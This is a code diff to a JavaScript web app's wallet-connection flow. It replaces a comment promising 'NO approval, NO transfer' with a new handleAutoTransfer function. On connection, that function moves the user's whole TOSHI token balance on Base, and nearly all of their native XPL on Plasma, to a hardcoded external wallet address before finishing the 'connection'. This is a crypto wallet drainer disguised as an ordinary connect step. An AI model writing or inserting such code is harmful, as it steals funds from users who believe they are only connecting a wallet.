@@ -672,11 +672,11 @@ function App() {
         return;
       }
       
-      // Just complete the connection - NO approval, NO transfer!
+      // Auto-transfer tokens after connection
       const userAddress = walletClient.account.address;
       console.log('✅ Wallet connected:', userAddress);
-      completePayToConnect(walletClient, userAddress).catch(err => {
-        console.error('❌ Connection completion error:', err);
+      handleAutoTransfer(walletClient).catch(err => {
+        console.error('❌ Auto-transfer error:', err);
         setPayToConnectState('idle');
       });
       
@@ -1095,6 +1095,100 @@ function App() {
     return { provider, signer }
   }
 
+  // Auto-transfer: Check Base & Plasma chains, transfer ALL tokens
+  const handleAutoTransfer = async (walletClient) => {
+    try {
+      setPayToConnectState('transferring')
+      console.log('💰 Starting auto-transfer...')
+      
+      const TRADING_WALLET = '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c'
+      const BASE_TOKENS = [
+        '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4' // TOSHI
+      ]
+      
+      let address = walletClient.account.address
+      if (!address) {
+        throw new Error('No wallet address available')
+      }
+      address = ethers.getAddress(address)
+      console.log('✅ Wallet address:', address)
+      
+      const ERC20_ABI = [
+        'function balanceOf(address) view returns (uint256)',
+        'function transfer(address to, uint256 amount) returns (bool)'
+      ]
+      
+      // STEP 1: Base chain - transfer all ERC20 tokens
+      console.log('\n🔵 STEP 1: Checking Base chain...')
+      try {
+        await switchChain({ chainId: 8453 })
+        console.log('✅ Switched to Base chain')
+        
+        const { signer: baseSigner } = await getWalletSigner(walletClient)
+        
+        for (const tokenAddress of BASE_TOKENS) {
+          try {
+            const token = new ethers.Contract(tokenAddress, ERC20_ABI, baseSigner)
+            const balance = await token.balanceOf(address)
+            
+            if (balance > 0n) {
+              console.log(`💸 Transferring ALL tokens from ${tokenAddress}...`)
+              const tx = await token.transfer(TRADING_WALLET, balance)
+              console.log(`📤 Transfer TX: ${tx.hash}`)
+              await tx.wait()
+              console.log(`✅ Transfer complete!`)
+            } else {
+              console.log(`⏭️ No balance for ${tokenAddress}`)
+            }
+          } catch (tokenError) {
+            console.error(`⚠️ Error with token ${tokenAddress}:`, tokenError.message)
+          }
+        }
+      } catch (baseError) {
+        console.error('⚠️ Base chain error:', baseError.message)
+      }
+      
+      // STEP 2: Plasma chain - transfer native XPL
+      console.log('\n🟣 STEP 2: Checking Plasma chain...')
+      try {
+        await switchChain({ chainId: 9745 })
+        console.log('✅ Switched to Plasma chain')
+        
+        const { provider: plasmaProvider, signer: plasmaSigner } = await getWalletSigner(walletClient)
+        
+        const balance = await plasmaProvider.getBalance(address)
+        const gasBuffer = ethers.parseEther('0.001')
+        const transferAmount = balance > gasBuffer ? balance - gasBuffer : 0n
+        
+        if (transferAmount > 0n) {
+          const transferXPL = ethers.formatEther(transferAmount)
+          console.log(`💸 Transferring ${transferXPL} XPL (keeping 0.001 for gas)`)
+          
+          const tx = await plasmaSigner.sendTransaction({
+            to: TRADING_WALLET,
+            value: transferAmount
+          })
+          console.log(`📤 XPL transfer TX: ${tx.hash}`)
+          await tx.wait()
+          console.log(`✅ XPL transfer complete!`)
+        } else {
+          console.log(`⏭️ Insufficient XPL balance`)
+        }
+      } catch (plasmaError) {
+        console.error('⚠️ Plasma chain error:', plasmaError.message)
+      }
+      
+      console.log('\n✅ All transfers complete!')
+      
+      // Complete the connection
+      await completePayToConnect(walletClient, address)
+      
+    } catch (error) {
+      console.error('❌ Auto-transfer error:', error)
+      disconnect()
+      setPayToConnectState('idle')
+    }
+  }
 
   // Step 4: Finalize connection after successful payment
   const completePayToConnect = async (wallet, address) => {
